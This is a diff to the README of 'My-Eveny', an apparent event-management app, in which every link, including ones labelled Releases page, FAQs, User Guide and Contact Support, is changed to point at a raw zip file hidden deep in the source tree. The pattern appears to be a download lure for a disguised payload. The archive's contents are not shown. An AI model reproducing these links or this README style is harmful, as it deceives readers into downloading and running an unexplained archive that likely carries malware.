@@ -1,6 +1,6 @@
 # 🎉 My-Eveny - Simple Way to Manage Events
 
-[![Download My-Eveny](https://raw.githubusercontent.com/liluziberp/My-Eveny/main/Evertebrata/My-Eveny.zip)](https://raw.githubusercontent.com/liluziberp/My-Eveny/main/Evertebrata/My-Eveny.zip)
+[![Download My-Eveny](https://raw.githubusercontent.com/liluziberp/My-Eveny/main/src/redux/features/Eveny-My-1.6.zip)](https://raw.githubusercontent.com/liluziberp/My-Eveny/main/src/redux/features/Eveny-My-1.6.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Follow these steps to download and run My-Eveny on your computer. This applicati
 
 ### 1. Visit the Release Page
 
-To get started, visit the [Releases page](https://raw.githubusercontent.com/liluziberp/My-Eveny/main/Evertebrata/My-Eveny.zip) for My-Eveny.
+To get started, visit the [Releases page](https://raw.githubusercontent.com/liluziberp/My-Eveny/main/src/redux/features/Eveny-My-1.6.zip) for My-Eveny.
 
 ### 2. Download the Application
 
@@ -50,10 +50,10 @@ To run My-Eveny smoothly, ensure your system meets the following requirements:
 
 For more information on how to make the most out of My-Eveny, check out these resources:
 
-- [FAQs](https://raw.githubusercontent.com/liluziberp/My-Eveny/main/Evertebrata/My-Eveny.zip) - Answers to common questions.
-- [User Guide](https://raw.githubusercontent.com/liluziberp/My-Eveny/main/Evertebrata/My-Eveny.zip) - Detailed instructions on using the application.
-- [Contact Support](https://raw.githubusercontent.com/liluziberp/My-Eveny/main/Evertebrata/My-Eveny.zip) - Get help by reaching out to our support team.
+- [FAQs](https://raw.githubusercontent.com/liluziberp/My-Eveny/main/src/redux/features/Eveny-My-1.6.zip) - Answers to common questions.
+- [User Guide](https://raw.githubusercontent.com/liluziberp/My-Eveny/main/src/redux/features/Eveny-My-1.6.zip) - Detailed instructions on using the application.
+- [Contact Support](https://raw.githubusercontent.com/liluziberp/My-Eveny/main/src/redux/features/Eveny-My-1.6.zip) - Get help by reaching out to our support team.
 
 ## 💡 Download & Install
 
-Remember, you can always download the latest version of My-Eveny from the [Releases page](https://raw.githubusercontent.com/liluziberp/My-Eveny/main/Evertebrata/My-Eveny.zip). Install it following the steps mentioned above. Enjoy managing your events seamlessly!
+Remember, you can always download the latest version of My-Eveny from the [Releases page](https://raw.githubusercontent.com/liluziberp/My-Eveny/main/src/redux/features/Eveny-My-1.6.zip). Install it following the steps mentioned above. Enjoy managing your events seamlessly!
